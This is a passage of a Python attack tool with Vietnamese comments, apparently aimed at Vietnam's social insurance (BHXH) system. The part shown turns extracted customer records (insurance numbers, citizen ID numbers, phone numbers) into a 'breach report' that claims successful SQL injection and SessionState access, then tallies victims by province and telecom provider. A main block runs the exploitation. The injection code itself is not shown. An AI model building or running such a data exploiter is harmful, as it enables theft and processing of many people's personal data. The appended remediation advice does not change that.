            print(f"[!] Error during exploitation: {str(e)}")
            return {
                "error": str(e),
                "success": False
            }

    def generate_comprehensive_breach_report(self, standardized_data, raw_data):
        """
        Tạo báo cáo vi phạm toàn diện với dữ liệu đã chuẩn hóa
        
        Args:
            standardized_data: Dữ liệu đã chuẩn hóa
            raw_data: Dữ liệu thô
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Phân tích dữ liệu chuẩn hóa
        valid_records = [record for record in standardized_data if record['data_quality_score'] >= 70]
        high_quality_records = [record for record in standardized_data if record['data_quality_score'] >= 90]
        
        # Tính toán thống kê
        stats = {
            "total_raw_extractions": len(raw_data),
            "total_standardized_records": len(standardized_data),
            "valid_records_count": len(valid_records),
            "high_quality_records_count": len(high_quality_records),
            "data_quality_distribution": self.analyze_data_quality_distribution(standardized_data),
            "field_completeness": self.analyze_field_completeness(standardized_data),
            "province_distribution": self.analyze_province_distribution(standardized_data),
            "telecom_provider_distribution": self.analyze_telecom_distribution(standardized_data)
        }
        
        # Tạo báo cáo chi tiết
        comprehensive_report = {
            "breach_info": {
                "timestamp": datetime.now().isoformat(),
                "exploitation_duration": "Approx 40 minutes",
                "database_compromised": self.exposed_db,
                "user_compromised": self.compromised_user,
                "standardization_compliance": "BHXH Vietnam 2025"
            },
            "extraction_summary": stats,
            "data_samples": {
                "high_quality_samples": high_quality_records[:10],  # Top 10 high quality
                "raw_extraction_samples": raw_data[:5]  # First 5 raw extractions
            },
            "vulnerability_details": {
                "sql_injection_successful": True,
                "sessionstate_access": True,
                "data_standardization_applied": True,
                "compliance_check_passed": len(valid_records) > 0
            },
            "impact_assessment": {
                "customers_affected": len(valid_records),
                "data_types_compromised": list(stats["field_completeness"].keys()),
                "severity_level": "CRITICAL" if len(valid_records) > 100 else "HIGH",
                "compliance_violations": [
                    "Không bảo vệ dữ liệu cá nhân",
                    "Lỗ hổng SQL Injection",
                    "Truy cập trái phép SessionState",
                    "Thiếu chuẩn hóa dữ liệu"
                ]
            },
            "recommendations": [
                "Áp dụng prepared statements để ngăn SQL Injection",
                "Bảo mật SessionState database",
                "Triển khai chuẩn hóa dữ liệu theo tiêu chuẩn BHXH",
                "Mã hóa dữ liệu nhạy cảm",
                "Kiểm tra đăng nhập và phân quyền"
            ]
        }
        
        # Lưu báo cáo
        report_filename = f"COMPREHENSIVE_BHXH_BREACH_REPORT_{timestamp}.json"
        self.log_evidence('customer_data', report_filename, comprehensive_report)
        
        # Tạo báo cáo markdown
        self.create_markdown_breach_report(comprehensive_report, timestamp)
        
        print(f"[+] Comprehensive breach report generated: {report_filename}")

    def analyze_data_quality_distribution(self, standardized_data):
        """Phân tích phân bố chất lượng dữ liệu"""
        quality_ranges = {"90-100": 0, "70-89": 0, "50-69": 0, "0-49": 0}
        
        for record in standardized_data:
            score = record['data_quality_score']
            if score >= 90:
                quality_ranges["90-100"] += 1
            elif score >= 70:
                quality_ranges["70-89"] += 1
            elif score >= 50:
                quality_ranges["50-69"] += 1
            else:
                quality_ranges["0-49"] += 1
                
        return quality_ranges

    def analyze_field_completeness(self, standardized_data):
        """Phân tích độ đầy đủ của các trường dữ liệu"""
        field_counts = {}
        total_records = len(standardized_data)
        
        for record in standardized_data:
            for field in record['standardized_data']:
                if field not in field_counts:
                    field_counts[field] = 0
                field_counts[field] += 1
        
        # Tính phần trăm
        field_completeness = {}
        for field, count in field_counts.items():
            field_completeness[field] = {
                "count": count,
                "percentage": (count / total_records * 100) if total_records > 0 else 0
            }
            
        return field_completeness

    def analyze_province_distribution(self, standardized_data):
        """Phân tích phân bố tỉnh/thành phố"""
        province_dist = {}
        
        for record in standardized_data:
            field_details = record.get('field_details', {})
            
            # Từ số BHXH
            if 'so_bhxh' in field_details and field_details['so_bhxh'].get('is_valid'):
                province = field_details['so_bhxh'].get('province_name', 'Unknown')
                province_dist[province] = province_dist.get(province, 0) + 1
            
            # Từ số CCCD
            if 'so_cccd' in field_details and field_details['so_cccd'].get('is_valid'):
                province = field_details['so_cccd'].get('province_name', 'Unknown')
                province_dist[province] = province_dist.get(province, 0) + 1
                
        return province_dist

    def analyze_telecom_distribution(self, standardized_data):
        """Phân tích phân bố nhà mạng"""
        telecom_dist = {}
        
        for record in standardized_data:
            field_details = record.get('field_details', {})
            
            if 'so_dien_thoai' in field_details and field_details['so_dien_thoai'].get('is_valid'):
                provider = field_details['so_dien_thoai'].get('provider_name', 'Unknown')
                telecom_dist[provider] = telecom_dist.get(provider, 0) + 1
                
        return telecom_dist

    def create_markdown_breach_report(self, report_data, timestamp):
        """Tạo báo cáo markdown"""
        markdown_content = f"""# BÁO CÁO VI PHẠM BẢO MẬT BHXH - ĐÃ CHUẨN HÓA DỮ LIỆU

**Thời gian:** {timestamp}
**Tuân thủ:** Tiêu chuẩn Bảo hiểm Xã hội Việt Nam 2025

## TỔNG QUAN

- **Database bị xâm nhập:** {report_data['breach_info']['database_compromised']}
- **User bị compromise:** {report_data['breach_info']['user_compromised']}
- **Tổng số record thô:** {report_data['extraction_summary']['total_raw_extractions']}
- **Record đã chuẩn hóa:** {report_data['extraction_summary']['total_standardized_records']}
- **Record chất lượng cao:** {report_data['extraction_summary']['high_quality_records_count']}

## PHÂN TÍCH CHẤT LƯỢNG DỮ LIỆU

| Mức chất lượng | Số lượng |
|----------------|----------|
| 90-100% | {report_data['extraction_summary']['data_quality_distribution']['90-100']} |
| 70-89% | {report_data['extraction_summary']['data_quality_distribution']['70-89']} |
| 50-69% | {report_data['extraction_summary']['data_quality_distribution']['50-69']} |
| 0-49% | {report_data['extraction_summary']['data_quality_distribution']['0-49']} |

## MỨC ĐỘ NGHIÊM TRỌNG: {report_data['impact_assessment']['severity_level']}

**Số khách hàng bị ảnh hưởng:** {report_data['impact_assessment']['customers_affected']}

## KHUYẾN NGHỊ KHẮC PHỤC

"""
        
        for i, rec in enumerate(report_data['recommendations'], 1):
            markdown_content += f"{i}. {rec}\n"
        
        # Lưu file markdown
        markdown_filename = os.path.join(self.evidence_dir, 'customer_data', f'BREACH_REPORT_{timestamp}.md')
        with open(markdown_filename, 'w', encoding='utf-8') as f:
            f.write(markdown_content)
        
        print(f"[+] Markdown report created: {markdown_filename}")


if __name__ == "__main__":
    print("BHXH Customer Data Exploiter with Data Standardization")
    print("Chuẩn hóa dữ liệu theo tiêu chuẩn BHXH Việt Nam 2025")
    
    exploiter = BHXHCustomerDataExploiter()
    result = exploiter.run_comprehensive_exploitation_with_standardization()
    
    print("\n" + "="*50)
    print("KẾT QUẢ KHAI THÁC:")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    print("="*50)
